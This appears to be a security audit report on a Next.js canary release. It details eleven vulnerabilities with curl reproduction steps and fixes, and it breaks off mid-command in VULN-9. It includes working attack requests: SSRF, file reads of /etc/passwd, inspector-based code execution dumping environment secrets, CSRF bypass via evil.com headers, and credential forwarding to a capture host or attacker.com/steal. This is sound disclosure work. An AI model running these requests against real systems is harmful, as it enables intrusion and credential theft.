# Next.js Security Audit Report

## Executive Summary

This audit examined Next.js commit `007051470157d38058730ffa0a1983d4b4106424` (v16.3.0-canary.29) for security vulnerabilities. Eleven issues were identified and confirmed against live instances in a Docker-based test environment:

| ID | Title | Severity |
|----|-------|----------|
| VULN-1 | SSRF via Image Optimizer Redirect (remotePatterns bypass) | High |
| VULN-2 | Auth Bypass via Internal Header Injection (NEXT_PRIVATE_TEST_HEADERS) | High |
| VULN-3 | Server Actions Execute Without Origin Header (defense-in-depth gap) | Medium |
| VULN-4 | Arbitrary File Read via Source Map Endpoint (webpack dev server) | High |
| VULN-5 | Unauthenticated V8 Inspector Open via Dev Endpoint | High |
| VULN-6 | Path Traversal in launch-editor via isAppRelativePath | Medium |
| VULN-7 | Server Action CSRF Bypass via x-forwarded-host Header Injection | High |
| VULN-8 | Middleware Rewrite SSRF with Credential Forwarding to Arbitrary Hosts | High |
| VULN-9 | DNS Rebinding Bypass of blockCrossSiteDEV (dev mode) | High |
| VULN-10 | Edge Runtime Server Action Unbounded Body (DoS) | Medium |
| VULN-11 | Route Oracle and SSR Skip via Unfiltered x-middleware-prefetch Header | High |

All eleven vulnerabilities are independently reproducible using the provided exploit scripts. Three end-to-end exploit chains (CHAIN-1 through CHAIN-3) combine individual vulnerabilities into complete attack scenarios — credential theft to account takeover, browser visit to full RCE, and route discovery to SSRF pivot — demonstrating critical real-world impact that cannot be dismissed as hypothetical.

---

## Scope

- **Repository:** next.js
- **Commit:** `007051470157d38058730ffa0a1983d4b4106424`
- **Version:** 16.3.0-canary.29
- **Testing Environment:** Docker containers on a private bridge network (`audit-net`)
- **Test Modes:** Production (`next build` + `next start`), Dev mode (`next dev --webpack`), and Edge runtime production (`next build` + `next start` with `export const runtime = 'edge'`)
- **Testing Date:** 2026-05-26

---

## VULN-1: SSRF via Image Optimizer Redirect (remotePatterns bypass)

**Severity:** High

**Affected Code:**
- `packages/next/src/server/image-optimizer.ts:454` — `validateParams` checks `hasRemoteMatch` on the initial URL only
- `packages/next/src/server/image-optimizer.ts:909-928` — `fetchExternalImage` follows redirects recursively without re-validating the redirect target against `remotePatterns`

**Root Cause:**

The `validateParams` function correctly validates that the requested image URL matches the configured `remotePatterns` allowlist. However, `fetchExternalImage` uses `fetch(..., { redirect: 'manual' })` and manually follows redirect responses by calling itself recursively with the `Location` header value. This recursive call passes the redirect target URL directly to `fetchExternalImage` without re-running the `remotePatterns` check via `validateParams` or `hasRemoteMatch`.

An attacker who controls any server in `remotePatterns` (or can intercept traffic to it) can redirect the image optimizer to an arbitrary host.

**Attack Scenario:**

A production deployment allows `remotePatterns` for `images.example.com` (legitimate CDN). An attacker sets up a redirect at `https://images.example.com/evil-redirect` that points to `http://internal-metadata-server/latest/meta-data/`. The image optimizer fetches the redirect target and returns its content as an "image," exfiltrating internal service data.

In the audit environment: `remotePatterns` allows `audit-redirect-server:8080`. A request to `/_next/image?url=http://audit-redirect-server:8080/redirect-to-secret&w=640&q=75` causes the optimizer to follow a redirect to `audit-secret-server:9090`, which is not in `remotePatterns`.

**Configuration note:** The Docker PoC sets `dangerouslyAllowLocalIP: true` in `next.config.js` because the test environment uses private Docker network IPs. Without this flag, redirects to private IP ranges (10.x, 172.16-31.x, 169.254.x, 127.x) are blocked by `isPrivateIp()` in `fetchExternalImage`. The core vulnerability — missing `remotePatterns` re-validation on redirect targets — works against any redirect target on a public IP without `dangerouslyAllowLocalIP`. For example, a redirect from an allowed CDN host to an attacker-controlled public server bypasses `remotePatterns` regardless of this setting.

**Reproduction Steps:**

```bash
# Negative control — direct access to secret server is blocked (400)
curl -s -o /dev/null -w '%{http_code}' \
  'http://localhost:3000/_next/image?url=http%3A%2F%2Faudit-secret-server%3A9090%2Fsecret-image.jpg&w=640&q=75'
# Expected: 400

# Positive exploit — redirect server in remotePatterns, redirects to secret server
curl -s -o /tmp/exploit.bin -w '%{http_code}' \
  'http://localhost:3000/_next/image?url=http%3A%2F%2Faudit-redirect-server%3A8080%2Fredirect-to-secret&w=640&q=75'
# Expected: 200

# Confirm secret server received the request
docker logs audit-secret-server 2>&1 | grep SECRET_ACCESS
# Expected: SECRET_ACCESS: <timestamp> <ip>
```

**Evidence:**
- Direct request to `audit-secret-server:9090` returns HTTP 400 confirming `remotePatterns` blocks it
- Redirect-mediated request returns HTTP 200 with image data from `audit-secret-server:9090`
- Secret server logs show `SECRET_ACCESS` entry from the Next.js container

**Remediation:**

Re-validate the redirect target against `remotePatterns` before following it. In `fetchExternalImage`, before recursing with the redirect URL, call `hasRemoteMatch(domains, remotePatterns, new URL(redirect))` and throw an `ImageError` if the redirect target is not in the allowlist. This requires threading `domains` and `remotePatterns` through `fetchExternalImage`'s call signature.

Alternatively, use `redirect: 'follow'` in the initial `fetch()` call only after ensuring the final URL matches `remotePatterns` by using a redirect hook or by resolving the full redirect chain before fetching.

---

## VULN-2: Auth Bypass via Internal Header Injection (NEXT_PRIVATE_TEST_HEADERS)

**Severity:** High (requires `NEXT_PRIVATE_TEST_HEADERS` env var to be set in production — a configuration error, not a default-state vulnerability)

**Affected Code:**
- `packages/next/src/server/lib/router-server.ts:230` — conditional skip of `filterInternalHeaders`
- `packages/next/src/server/lib/server-ipc/utils.ts:42-64` — `INTERNAL_HEADERS` list and `filterInternalHeaders` implementation
- `packages/next/src/server/async-storage/request-store.ts:117-143` — `mergeMiddlewareCookies` reads `x-middleware-set-cookie` from request headers

**Root Cause:**

`router-server.ts` calls `filterInternalHeaders(req.headers)` to strip internal Next.js headers from incoming requests before processing. This is the primary security boundary preventing external callers from spoofing internal headers. The bypass:

```typescript
// router-server.ts:230
if (!process.env.NEXT_PRIVATE_TEST_HEADERS) {
  filterInternalHeaders(req.headers)
}
```

When the env var `NEXT_PRIVATE_TEST_HEADERS=1` is set, all internal header filtering is skipped. An external client can then send `x-middleware-set-cookie` with arbitrary cookie values. `mergeMiddlewareCookies` in `request-store.ts` reads this header and merges it into the `cookies()` store, making the attacker-controlled values available to any code that calls `await cookies()`.

**Attack Scenario:**

A developer or CI pipeline accidentally sets `NEXT_PRIVATE_TEST_HEADERS=1` in a production or staging environment. An external attacker sends:

```
x-middleware-set-cookie: session=admin_session_token; Path=/
```

Any server component reading `cookies().get('session')` now sees `admin_session_token`, bypassing session-based authentication entirely.

**Reproduction Steps:**

```bash
# Normal app (port 3000) — header is filtered, shows Access Denied
curl -s \
  -H 'x-middleware-set-cookie: session=admin_session_token; Path=/' \
  'http://localhost:3000/protected'
# Expected: contains "Access Denied"

# Test-headers app (port 3001, NEXT_PRIVATE_TEST_HEADERS=1) — header passes through
curl -s \
  -H 'x-middleware-set-cookie: session=admin_session_token; Path=/' \
  'http://localhost:3001/protected'
# Expected: contains "ADMIN_SECRET_DATA: launch_codes_42"
```

**Evidence:**
- Port 3000 (normal): returns `Access Denied` regardless of injected headers
- Port 3001 (`NEXT_PRIVATE_TEST_HEADERS=1`): returns `ADMIN_SECRET_DATA: launch_codes_42` with injected session cookie

**Remediation:**

`NEXT_PRIVATE_TEST_HEADERS` must never be set in production or staging environments. Its name already signals test-only usage, but the risk should be documented explicitly. Consider:

1. Adding a startup warning when `NEXT_PRIVATE_TEST_HEADERS` is set and `NODE_ENV` is `production`.
2. Restricting the bypass further — e.g., only allow it when also in `NODE_ENV=test` or when a specific CI flag is set.
3. Documenting `NEXT_PRIVATE_TEST_HEADERS` as a security-sensitive variable in the framework's environment variable documentation.

---

## VULN-3: Server Actions Execute Without Origin Header (defense-in-depth gap)

**Severity:** Medium

**Affected Code:**
- `packages/next/src/server/app-render/action-handler.ts:646-651` — explicit allowance for requests without `origin` header
- `packages/next/src/server/app-render/action-handler.ts:1388` — `ACTION_ID_EXPECTED_LENGTH = 42`

**Root Cause:**

The CSRF protection in Server Actions checks the `origin` header against the `host`/`x-forwarded-host` header. When no `origin` header is present, the code logs a warning but allows the action to proceed:

```typescript
// action-handler.ts:646-651
if (!originHost) {
  // This is a handcrafted request without an origin or a request from an unsafe browser.
  // We'll let this through but log a warning.
  // We can't guard against unsafe browsers and handcrafted requests can't contain
  // user credentials that haven't been shared willingly.
  warning = 'Missing `origin` header from a forwarded Server Actions request.'
}
```

This is an explicitly documented design decision. The logic is that handcrafted requests (curl, scripts) cannot obtain user credentials without cooperation; only browser-originated cross-site requests — which always include an `Origin` header — pose real CSRF risk.

**Important caveat:** This behavior is intentional. The comment in the source code accurately describes the threat model. A standard browser-based CSRF attack will always send an `Origin` header, and the check handles that case. This is a defense-in-depth gap rather than an exploitable vulnerability in the traditional sense.

**Residual risk scenario:**

The gap becomes relevant in environments where:
1. A compromised proxy or middleware strips or suppresses `Origin` headers before they reach Next.js, or
2. A victim's credentials (cookies) are somehow already known to an attacker (e.g., via a separate leak), and the attacker wants to invoke server actions on the victim's behalf using a scripted request.

In both cases, the attacker can invoke server actions without triggering CSRF protection, provided they also supply valid session credentials.

**Reproduction Steps:**

```bash
# Extract action ID from built manifest (42 hex chars per ACTION_ID_EXPECTED_LENGTH)
ACTION_ID=$(docker exec audit-nextjs-app \
  cat /app/.next/server/server-reference-manifest.json \
  | grep -oE '[0-9a-f]{42}' | head -1)

# Invoke server action without Origin header
curl -s -X POST \
  -H "Next-Action: $ACTION_ID" \
  -H "Content-Type: text/plain;charset=UTF-8" \
  -H "Cookie: session=victim_session" \
  --data '[]' \
  'http://localhost:3000/'
# Expected: HTTP 200, action executes, response contains session value
```

**Evidence:**
- Action executes and returns HTTP 200 without `origin` header
- Server logs show warning: `Missing 'origin' header from a forwarded Server Actions request`
- With a mismatched `Origin` header, the action is rejected with "Invalid Server Actions request"

**Remediation:**

The current behavior is a deliberate trade-off. Options to improve defense-in-depth:

1. **Require explicit opt-in for missing-origin allowance:** Add a framework config option (e.g., `serverActions.allowMissingOrigin: false`) to reject requests with no `Origin` header in production.
2. **Document the threat model:** Add explicit documentation explaining why missing-origin requests are allowed and under what deployment conditions this becomes a risk (compromised proxies, credential-sharing scenarios).
3. **Add stricter default for production:** Consider rejecting missing-origin requests by default in production mode (`NODE_ENV=production`) and allowing them only in development.

---

---

## VULN-4: Arbitrary File Read via Source Map Endpoint (webpack dev server)

**Severity:** High

**Affected Code:**
- `packages/next/src/server/dev/middleware-webpack.ts:697-710` — `/__nextjs_source-map` handler, user-controlled `filename` with no validation
- `packages/next/src/server/dev/get-source-map-from-file.ts:26-80` — `getSourceMapFromFile`: reads arbitrary file, follows `//# sourceMappingURL=` to a second arbitrary file, parses and returns it as JSON

**Root Cause:**

The `/__nextjs_source-map` endpoint is registered by the webpack hot-reloader. It accepts a `filename` query parameter, converts it to a `file://` URL if the path is absolute, and calls `getSourceMapFromFile`. That function:

1. Reads the file at the supplied path via `fs.readFile` with no path validation or allowlist.
2. Scans for a `//# sourceMappingURL=<target>` comment and resolves the target path via `path.resolve(path.dirname(filename), decodeURIComponent(sourceUrl))` — again with no validation.
3. Reads the resolved target path, parses it as JSON, and returns the parsed source map (including `sourcesContent`) to the client.

There is no authentication on this endpoint. Cross-origin requests from curl (no `Origin` header) are allowed because `blockCrossSiteDEV` returns `false` when `originLowerCase` is `undefined`.

**Error oracle:** For non-existent or non-readable files, the endpoint returns HTTP 500 with the error message (including the filename) in the response body — functioning as a file existence oracle for arbitrary paths.

**Attack Scenario:**

Any process or script that can reach the dev server's port can read arbitrary files on the filesystem. By constructing a "chain" file containing `//# sourceMappingURL=/path/to/target`, the attacker causes the endpoint to read and return the target file's contents. If the target is valid JSON (e.g., a `.json` config file, a source map, or a crafted file containing secrets), the full contents are returned. For non-JSON targets (e.g., `/etc/passwd`), a 500 error with the target path confirms file existence.

In the audit environment: `/tmp/chain.js` contains `//# sourceMappingURL=/tmp/secret_sourcemap.json`. Requesting `/__nextjs_source-map?filename=/tmp/chain.js` returns a 200 with `sourcesContent: ["DEV_SECRET_KEY=sk-live-production-key-12345"]`.

**Reproduction Steps:**

```bash
# Negative control — nonexistent file returns 500 with path in error
curl -s 'http://localhost:3002/__nextjs_source-map?filename=/nonexistent/path.js'
# Expected: 500 with error body mentioning the path

# Positive exploit — chain file exfiltrates secret_sourcemap.json contents
curl -s 'http://localhost:3002/__nextjs_source-map?filename=/tmp/chain.js'
# Expected: 200 JSON with sourcesContent containing DEV_SECRET_KEY

# System file probe — chain_etc_passwd.js follows sourceMappingURL to /etc/passwd
curl -s 'http://localhost:3002/__nextjs_source-map?filename=/tmp/chain_etc_passwd.js'
# Expected: 500 with JSON parse error referencing /etc/passwd (file was read)
```

**Evidence:**
- HTTP 200 response to chain.js request contains `DEV_SECRET_KEY=sk-live-production-key-12345` from `sourcesContent`
- HTTP 500 response to chain_etc_passwd.js request contains error referencing `/etc/passwd` — proving the file was read and attempted to parse as JSON
- HTTP 500 response to nonexistent path request contains the supplied path — confirming file existence oracle

**Remediation:**

Restrict the `filename` parameter to paths within the project root (or the webpack compilation output directory). Validate that the resolved path starts with the Next.js root directory before calling `fs.readFile`. Apply the same check to the resolved `sourceMappingURL` target path. Alternatively, only serve source maps for modules that are actually tracked in the webpack module graph, rejecting requests for arbitrary filesystem paths.

---

## VULN-5: Unauthenticated V8 Inspector Open via Dev Endpoint

**Severity:** High

**Affected Code:**
- `packages/next/src/next-devtools/server/attach-nodejs-debugger-middleware.ts:13-43` — `/__nextjs_attach-nodejs-inspector` handler, no authentication, calls `inspector.open(debugPort)` unconditionally

**Root Cause:**

The `/__nextjs_attach-nodejs-inspector` endpoint is registered by both webpack and Turbopack hot-reloaders. It accepts GET requests from any caller (no authentication, no method restriction, no Origin check). When called, it:

1. Calls `inspector.open(debugPort)` to start the V8 inspector if it is not already running.
2. Fetches `http://{inspectorURL.host}/json/list` from the now-running inspector.
3. Returns the first debug target's `devtoolsFrontendUrl` in a JSON response.

Any caller who can reach the dev server port can force the V8 inspector open and obtain the WebSocket debugger URL. From there, CDP `Runtime.evaluate` can execute arbitrary JavaScript in the Node.js process — reading environment variables, filesystem contents, making network calls, or spawning child processes.

**Severity note:** The default `inspector.open()` binding is `127.0.0.1:9229` (localhost only). On a local dev machine, this is reachable by any local process or a web page exploiting DNS rebinding on localhost. To simulate a network-accessible scenario (e.g., a container or VM exposed to a LAN), the PoC starts `next dev` with `NODE_OPTIONS='--inspect=0.0.0.0:9229'`. The core vulnerability — unauthenticated `inspector.open()` with no opt-in — exists regardless of binding address.

**Attack Scenario:**

A developer runs `next dev` on a machine accessible to other users or processes (shared dev server, LAN, CI environment). Any local process calls `GET /__nextjs_attach-nodejs-inspector`. The V8 inspector opens. The attacker connects via CDP WebSocket, sends `Runtime.evaluate` commands, and reads secrets from `process.env`, reads source files, or exfiltrates data. This requires no credentials and leaves no application-level log entry.

**Reproduction Steps:**

```bash
# Step 1: Open inspector without authentication
curl -s 'http://localhost:3002/__nextjs_attach-nodejs-inspector'
# Expected: 200 JSON with devtoolsFrontendUrl

# Step 2: Get WebSocket debugger URL
curl -s 'http://localhost:9230/json/list'
# Expected: JSON array with webSocketDebuggerUrl

# Step 3: Execute arbitrary code via CDP
WS_URL=$(curl -s 'http://localhost:9230/json/list' | grep -o '"ws://[^"]*"' | head -1 | tr -d '"')
node autofyn_audit/exploits/inspector_rce.mjs "$WS_URL" "require('fs').readFileSync('/etc/passwd','utf-8')"
# Expected: contents of /etc/passwd

node autofyn_audit/exploits/inspector_rce.mjs "$WS_URL" "JSON.stringify(process.env)"
# Expected: JSON object containing all environment variables including secrets
```

**Evidence:**
- `/__nextjs_attach-nodejs-inspector` returns 200 with devtools URL without any credentials
- CDP `Runtime.evaluate` successfully executes `fs.readFileSync('/etc/passwd')` — output includes `root:x:0:0:root`
- CDP `Runtime.evaluate` returns `process.env` including `REACT_EDITOR` and all container environment variables

**Remediation:**

Gate the `/__nextjs_attach-nodejs-inspector` endpoint behind a check that the request originates from localhost (or from the same user session). Require an explicit opt-in environment variable (e.g., `NEXT_ENABLE_INSPECTOR=1`) rather than opening the inspector on any unauthenticated request. At minimum, validate the `Origin` header or require a secret token passed as a query parameter.

---

## VULN-6: Path Traversal in launch-editor via isAppRelativePath

**Severity:** Medium

**Affected Code:**
- `packages/next/src/server/dev/middleware-webpack.ts:646-654` — `/__nextjs_launch-editor` handler: `path.join('app', isSrcDir ? 'src' : '', relativeFilePath)` does not sanitize traversal sequences
- `packages/next/src/next-devtools/server/launch-editor.ts:455-469` — `filePath = path.join(nextRootDirectory, file)`: resolves traversal to absolute path, then calls `fsp.access(filePath, F_OK)` and `launchEditor(filePath, ...)`

**Root Cause:**

When `isAppRelativePath=1` is supplied, the handler computes `appPath = path.join('app', '', relativeFilePath)`. Node's `path.join` normalizes `..` components: `path.join('app', '', '../../../../etc/passwd')` = `../../../../etc/passwd`. This relative path is then passed to `launch-editor.ts`, which prepends the Next.js root directory: `path.join('/app', '../../../../etc/passwd')` = `/etc/passwd`.

The code then calls `fsp.access(filePath, F_OK)` — returning HTTP 204 if the file exists, and HTTP 404 otherwise. This creates a **file existence oracle**: an attacker can enumerate arbitrary filesystem paths by observing the 204/404 differential.

With `REACT_EDITOR=cat` (or any other non-editor binary) set in the environment, matching files are additionally passed to `child_process.spawn(editor, [filePath])`. This amplifies the oracle to include a command execution side-channel (output goes to server stdout).

**Note:** The file existence oracle is the primary exploit and requires no environment configuration. The command execution side-channel requires the server to have a permissive `REACT_EDITOR` setting, which is not the default.

**Attack Scenario:**

An attacker on the network (or any local process) sends:
```
GET /__nextjs_launch-editor?file=../../../../etc/shadow&isAppRelativePath=1
```
A 204 response confirms `/etc/shadow` is readable. By iterating over common secret file paths (`/root/.ssh/id_rsa`, `/etc/secrets/db-password`, etc.), the attacker maps the server's filesystem without any authentication.

The same vulnerability is present in `middleware-turbopack.ts:399-409` — the path traversal applies regardless of bundler.

**Reproduction Steps:**

```bash
# Negative control — nonexistent file returns 404
curl -s -o /dev/null -w '%{http_code}' \
  'http://localhost:3002/__nextjs_launch-editor?file=nonexistent_xyz.txt&isAppRelativePath=1'
# Expected: 404

# Positive exploit — path traversal to /etc/passwd
curl -s -o /dev/null -w '%{http_code}' \
  'http://localhost:3002/__nextjs_launch-editor?file=../../../../etc/passwd&isAppRelativePath=1'
# Expected: 204 (file exists at /etc/passwd — traversal confirmed)

# Secret file probe
curl -s -o /dev/null -w '%{http_code}' \
  'http://localhost:3002/__nextjs_launch-editor?file=../../../../tmp/dev_secret.txt&isAppRelativePath=1'
# Expected: 204 (file exists outside project root)
```

**Evidence:**
- Nonexistent file returns 404 — baseline confirmed
- `../../../../etc/passwd` traversal returns 204 — `/etc/passwd` found outside `/app`
- `../../../../tmp/dev_secret.txt` traversal returns 204 — confirms oracle reaches `/tmp`

**Remediation:**

After computing `appPath`, validate that `path.resolve(nextRootDirectory, appPath)` starts with `nextRootDirectory` before proceeding. Alternatively, validate `relativeFilePath` does not contain `..` components. The `path.resolve` + prefix check pattern is the standard mitigation for path traversal in Node.js.

---

## VULN-7: Server Action CSRF Bypass via x-forwarded-host Header Injection

**Severity:** High

**Affected Code:**
- `packages/next/src/server/app-render/action-handler.ts:482-518` — `parseHostHeader`: when called without `originDomain`, unconditionally returns `x-forwarded-host` value if present, prioritizing it over the `host` header
- `packages/next/src/server/app-render/action-handler.ts:635,652` — CSRF check calls `parseHostHeader(req.headers)` (without `originDomain`) and compares `originHost` against the returned value
- `packages/next/src/server/lib/server-ipc/utils.ts:42-54` — `INTERNAL_HEADERS` list does not include `x-forwarded-host`, so it is never stripped by `filterInternalHeaders`

**Root Cause:**

The CSRF check for Server Actions compares the `origin` header's host against the value returned by `parseHostHeader(req.headers)`. The `parseHostHeader` function, when called without the optional `originDomain` parameter (as it is at line 635), returns `x-forwarded-host` unconditionally if that header is present, falling back to `host` only if `x-forwarded-host` is absent.

The `filterInternalHeaders` function in `server-ipc/utils.ts` strips headers in the `INTERNAL_HEADERS` list from incoming requests before processing. `x-forwarded-host` is not in this list. An external attacker can therefore inject `x-forwarded-host` with an arbitrary value.

Attack: send `Origin: https://evil.com` (sets `originHost = "evil.com"`) together with `x-forwarded-host: evil.com` (sets `host.value = "evil.com"` via `parseHostHeader`). The CSRF check `originHost === host.value` evaluates `"evil.com" === "evil.com"` — match passes. The action executes.

**Note:** `parseHostHeader` has an `originDomain` parameter (lines 493-504) designed to constrain which host values can be returned. However, the actual CSRF check at line 635 never passes `originDomain`. The defense exists in code but is not wired up.

**Precondition:** Next.js must be directly internet-facing without an upstream proxy that rewrites or removes `x-forwarded-host`. Deployments behind Nginx, Cloudflare, or a load balancer that sets `x-forwarded-host` to the actual client hostname are NOT affected — the proxy's value overwrites the attacker's.

**Browser mitigation note:** Modern browsers default to `SameSite=Lax` for cookies, which prevents cross-site POST requests from including cookies. This mitigates the browser-based CSRF vector for cookies without explicit `SameSite=None`. However, the bypass remains exploitable for: (1) applications that set `SameSite=None` on session cookies (common for cross-site embedding or OAuth flows), (2) non-browser attack scenarios (compromised proxies, network intermediaries, or scripted requests with stolen credentials), and (3) any deployment where cookies are explicitly configured as `SameSite=None; Secure`.

**Attack Scenario:**

A Next.js application is deployed directly on a cloud VM without a reverse proxy. A cross-origin attacker wants to invoke a Server Action (e.g., a privileged mutation) on behalf of a victim user. Normal CSRF protection rejects requests where `Origin` does not match `host`. The attacker sends:

```
Origin: https://evil.com
x-forwarded-host: evil.com
```

The CSRF check passes. The attacker invokes the Server Action with the victim's session cookie (obtained via a separate XSS or cookie-stealing attack), executing the privileged operation.

**Reproduction Steps:**

```bash
# Extract 42-char action ID from manifest
ACTION_ID=$(docker exec audit-nextjs-app \
  cat /app/.next/server/server-reference-manifest.json \
  | grep -oE '[0-9a-f]{42}' | head -1)

# Negative control — mismatched Origin, no x-forwarded-host (should be rejected)
NEG_STATUS=$(curl -s -o /tmp/neg_body.txt -w '%{http_code}' -X POST \
  -H "Next-Action: $ACTION_ID" \
  -H "Content-Type: text/plain;charset=UTF-8" \
  -H "Cookie: session=victim_csrf_token" \
  -H "Origin: https://evil.com" \
  --data '[]' \
  'http://localhost:3000/')
# Expected: non-200 status, OR body contains "Invalid Server Actions request"

# Positive exploit — Origin: https://evil.com + x-forwarded-host: evil.com (should bypass)
curl -s -X POST \
  -H "Next-Action: $ACTION_ID" \
  -H "Content-Type: text/plain;charset=UTF-8" \
  -H "Cookie: session=victim_csrf_token" \
  -H "Origin: https://evil.com" \
  -H "x-forwarded-host: evil.com" \
  --data '[]' \
  'http://localhost:3000/'
# Expected: HTTP 200, no "Invalid Server Actions request" in body
```

**Evidence:**
- Without `x-forwarded-host`: request rejected (non-200 status or CSRF error body) — baseline protection confirmed
- With `x-forwarded-host: evil.com`: request returns HTTP 200 without CSRF error — bypass confirmed
- `INTERNAL_HEADERS` in `utils.ts:42-54` does not include `x-forwarded-host` — header passes unstripped

**Remediation:**

Option 1: Add `x-forwarded-host` to the `INTERNAL_HEADERS` list in `server-ipc/utils.ts`. This strips the header for all external requests, preventing injection. Deployments that legitimately rely on `x-forwarded-host` would need to configure trust explicitly.

Option 2: Wire the `originDomain` parameter at `action-handler.ts:635`: change `parseHostHeader(req.headers)` to `parseHostHeader(req.headers, originHost)`. This makes the function return a value only if it matches the origin, regardless of which header provides it.

Option 3: Add a `serverActions.trustXForwardedHost` config flag (defaulting to `false`) that controls whether `x-forwarded-host` is trusted for CSRF checking, similar to the `trustHost` pattern used in other frameworks.

---

## VULN-8: Middleware Rewrite SSRF with Credential Forwarding to Arbitrary Hosts

**Severity:** High

**Affected Code:**
- `packages/next/src/server/lib/router-utils/proxy-request.ts:25-36` — `proxyRequest`: creates `http-proxy` instance with `changeOrigin: true`; `http-proxy` forwards all original request headers (including `Cookie` and `Authorization`) to the target by default
- `packages/next/src/server/lib/router-server.ts:499-508` — calls `proxyRequest(req, res, parsedUrl, ...)` when middleware rewrite destination has a protocol (cross-origin), with no host validation
- `packages/next/src/server/lib/router-utils/resolve-routes.ts:726-739` — when `x-middleware-rewrite` contains a cross-origin URL, returns `{finished: true, parsedUrl}` with the full external URL preserved in `parsedUrl`
- `packages/next/src/server/web/utils.ts:141-152` — `validateURL`: validates only that the rewrite destination is a parseable absolute URL; performs no host allowlist check

**Root Cause:**

`NextResponse.rewrite(destination)` sets the `x-middleware-rewrite` response header to the destination URL. When the destination is on a different origin than the application (different host or protocol), `resolve-routes.ts` returns `finished: true` with the full external URL. `router-server.ts` then calls `proxyRequest`, which uses `http-proxy` to forward the original request — including ALL headers — to the external target.

There is no host allowlist or validation for rewrite destinations at any point in this pipeline. Any URL that passes `new URL()` parsing is accepted. Crucially, `http-proxy` forwards the `Cookie` and `Authorization` headers from the original client request to the attacker-controlled destination.

This means that a middleware reading any user-controlled value (query parameter, header, path segment) and using it as a rewrite destination enables SSRF with full credential forwarding.

**Attack Scenario:**

A Next.js application uses middleware to route to different backends based on a query parameter (a common pattern for multi-tenant routing, A/B testing, or locale-based backends). An attacker sends a request to the application with a crafted `?backend=` parameter pointing to an attacker-controlled server. The middleware rewrites to the attacker's server. The `proxyRequest` call forwards the victim user's `Cookie` and `Authorization` headers to the attacker's server, leaking credentials.

In a realistic scenario: a victim user visits `https://app.example.com/?backend=https://attacker.com/steal` (e.g., via a phishing link or injected URL). The middleware rewrites the request to `attacker.com/steal`, forwarding the victim's session cookie. The attacker logs the cookie and takes over the session.

**Reproduction Steps:**

```bash
# Negative control — normal request returns the app page
curl -s 'http://localhost:3003/'
# Expected: HTTP 200 with "Middleware Audit App" in body

# Positive exploit — rewrite to attacker-controlled server with victim credentials
curl -s \
  -H "Cookie: session=VICTIM_SECRET_TOKEN_12345" \
  -H "Authorization: Bearer sk-secret-api-key-67890" \
  'http://localhost:3003/?backend=http://audit-credential-capture:9091/steal'
# Expected: HTTP 200 (proxy completed successfully)

# Verify credentials were captured by attacker server
docker logs audit-credential-capture 2>&1 | grep CREDENTIAL_CAPTURED
# Expected: lines containing VICTIM_SECRET_TOKEN_12345 and sk-secret-api-key-67890
```

**Evidence:**
- Normal request (`GET /`) returns HTTP 200 with app page — app running correctly
- Exploit request with `?backend=http://audit-credential-capture:9091/steal` returns HTTP 200
- `docker logs audit-credential-capture` shows `CREDENTIAL_CAPTURED: cookie=session=VICTIM_SECRET_TOKEN_12345` and `CREDENTIAL_CAPTURED: authorization=Bearer sk-secret-api-key-67890`

**Remediation:**

Option 1: Strip credential headers (`Cookie`, `Authorization`, `X-Auth-*`) before proxying to cross-origin rewrite destinations in `proxy-request.ts`. Credentials should only be forwarded to the application's own origin.

Option 2: Add a `rewrites.allowedExternalHosts` config option (analogous to `images.remotePatterns`) that restricts which external hosts middleware may rewrite to. Reject rewrites to hosts not in the allowlist.

Option 3: Document the credential-forwarding behavior prominently in the `NextResponse.rewrite()` documentation, so developers using user-controlled values as rewrite destinations understand the risk. This is a mitigation, not a fix.

**PoC note:** The audit test app uses purpose-built middleware that passes a query parameter directly to `NextResponse.rewrite()`. In production, middleware that uses any request-derived value (path segments, cookies, headers) as a rewrite destination is susceptible to the same credential-forwarding issue. Common patterns include multi-tenant routing, A/B testing backends, and locale-based backend selection.

---

## VULN-9: DNS Rebinding Bypass of blockCrossSiteDEV (dev mode)

**Severity:** High

**Affected Code:**
- `packages/next/src/server/lib/router-utils/block-cross-site-dev.ts:116-175` — `blockCrossSiteDEV`: lines 169-174 allow all requests with no `Origin` header; the `Host` header is never validated

**Root Cause:**

`blockCrossSiteDEV` guards all `/__nextjs*` and `/_next/*` dev endpoints from cross-origin access. Its final condition at lines 169-174:

```typescript
// Allow requests with no origin since those are just GET requests from same-site
return (
  originLowerCase !== undefined &&
  !isCsrfOriginAllowed(originLowerCase, allowedOrigins) &&
  blockRequest(req, res, originLowerCase)
)
```

When `Origin` is absent, `originLowerCase === undefined` and the expression short-circuits to `false` — the request is allowed through. The function checks `Origin` and `Referer` but never the `Host` header.

Under DNS rebinding, the browser makes **same-origin** requests to the rebound address. Same-origin requests carry no `Origin` header. The `sec-fetch-site` check at lines 138-154 also does not trigger — it requires `sec-fetch-mode === 'no-cors' && sec-fetch-site === 'cross-site'`, but a DNS-rebound request has `sec-fetch-site: same-origin`.

**Attack Scenario:**

1. Attacker registers `evil.com` with short DNS TTL, initially pointing to their server.
2. Developer visits `http://evil.com:3000/` in Firefox or Safari. Attacker serves a malicious page.
3. DNS TTL expires. `evil.com` is rebound to `127.0.0.1`.
4. JavaScript on the page executes `fetch('/__nextjs_source-map?filename=...')` — same-origin (same scheme + host + port from browser's perspective) — no `Origin` header sent.
5. Browser sends `Host: evil.com:3000`, `sec-fetch-site: same-origin`, no `Origin`.
6. `blockCrossSiteDEV` returns `false` (no Origin -> undefined -> short-circuit).
7. Source map handler returns full source code including secrets. Attacker reads the response.

**Affected endpoints:** ALL `/__nextjs*` and `/_next/*` endpoints — source maps, stack frames, launch-editor, attach-inspector (→ RCE chain), restart-dev, devtools-config.

**Browser mitigation:** Chrome Private Network Access (PNA) blocks requests from public websites to `localhost` since Chrome 94+. Firefox and Safari do **not** implement PNA. The attack is exploitable in Firefox and Safari.

**Distinction from VULN-4/5/6:** VULN-4/5/6 require direct network access to the dev server (an attacker already on the network). VULN-9 requires only that the developer visits a malicious webpage — the browser makes the localhost connection. Different attack vector (browser-based), different root cause (missing Host validation in blockCrossSiteDEV).

**Reproduction Steps:**

```bash
# Negative control — explicit cross-origin Origin header is blocked (403)
curl -s -o /dev/null -w '%{http_code}' \
  -H "Origin: http://evil.com" \
  "http://localhost:3002/__nextjs_source-map?filename=test"
# Expected: 403

# DNS rebinding bypass — evil Host header, NO Origin header
curl -s -o /dev/null -w '%{http_code}' \
  -H "Host: evil.com:3000" \
  "http://localhost:3002/__nextjs_source-map?filename=test"
# Expected: non-403 (204 No Content — request reached the handler)

# Source code exfiltration — read project source file
curl -s -H "Host: evil.com:3000" \
